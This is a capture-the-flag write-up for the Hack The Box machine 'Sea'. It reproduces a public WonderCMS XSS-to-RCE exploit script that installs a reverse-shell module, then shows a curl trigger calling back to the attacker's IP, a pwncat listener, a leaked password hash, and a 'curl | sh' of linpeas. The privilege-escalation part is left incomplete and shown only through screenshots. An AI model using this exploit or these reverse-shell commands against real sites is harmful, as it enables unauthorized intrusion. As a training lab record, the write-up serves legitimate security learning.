# Sea Heist - HTB Writeup

## PART ONE: USER

Let’s begin with an nmap scan:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e354e072203c014293d1669d900cabe8 (RSA)
|   256 f3244b08aa519d56153d6756747c2038 (ECDSA)
|_  256 30b105c64150ff22a37f41060e67fd50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

IIt seems like there are two services, HTTP and SSH, which are pretty common. Let's focus on HTTP first. And to do so, I will need to add the box to our `/etc/hosts`.

Let's have a look at the site :

['site first look'](site1.png)

Nothing special at first glance. There is another page `How to participate`. That leads to `contact.php`.

I tried many things on this page but it was a waste of time. Let's get back to a good old `fuff` scan :

```bash
ffuf -c -w /opt/seclists/Discovery/Web-Content/big.txt -u "http://$TARGET/FUZZ" -recursion -recursion-depth 4 -fc 302,401,403
```

After searching for a while, I came across two interesting paths: `/themes/bike/version` and `/themes/bike/Readme.md`. With them I learn that the site is using the `WonderCMS` framework in it's version 3.2.0.

Let's dig for some exploits on [exploit-db.com](https://www.exploit-db.com/exploits/51805).

I found a pretty intereting one with `WonderCMS` version 4.3.2.

```python
# Author: prodigiousMind
# Exploit: Wondercms 4.3.2 XSS to RCE


import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "'''+str(sys.argv[1])+'''";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
```

I tried it but it does not work. Let's analyse it to understand how it works. It seems like the above code install a module called RevShell and save it to `themes/revshell-main/rev.php`. And then execute it : `xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);`

Okay. Let's try something like :

```bash
curl http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.16.61+&lport=1234
```

And starting the listenner :

```bash
pwncat-cs :1234
```

If you don't know pwncat yet, you should definitely have a look. And boom, I get in !

```bash
wncat-cs :1234
[19:20:51] Welcome to pwncat 🐈!                                                      __main__.py:164
[19:53:25] received connection from 10.10.11.28:35156                                      bind.py:84
[19:53:33] 0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                 manager.py:957
[19:53:35] 10.10.11.28:35156: registered new host w/ db                                manager.py:957
(local) pwncat$                                                                                      
(remote) www-data@sea:/$ whoami
www-data
```

Now we need to find to way to connect ourselve as a user. I proceed to some search and found `/var/www/sea/data/database.js`.

```javascript
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

And to find the username just `ls /home`. There is two users `amay` and `geo`. Now we can ssh and validate the user flag !

## PART TWO: ROOT

Now about privilege escalation. There is no script or sudo command execution.

So let's do linpeas. To download it on the box we can start a local server :

```bash
python3 -m http.server 80
```

And curl on the box what we need :

```bash
curl http://10.10.16.61/linpeas.sh | sh
```

After analysing the result there is nothing amazing. However, there is port `8080` opened. We can make an ssh port forwarding :

```bash
ssh -L 8888:localhost:8080 amay@sea.htb
```

And visit here on our browser :

[root site](./site3.png)

Well this a System Monitor page. The first thing I notice is the Analyze part with a file selection. LFI ?

Let's investigate on burpsuite.

[burpsuite-capture](burp1.png)

Let's try something like this :

[burpsuite-lfi](burp2.png)

Hmmmm. Why not trying to put an error ?

[burpsuite-lfi-error](burp3.png)

And boom ! This it !

Thanks for reading, please tell me if this writeup needs some changes to improve clarity, grammar, and technical accuracy.
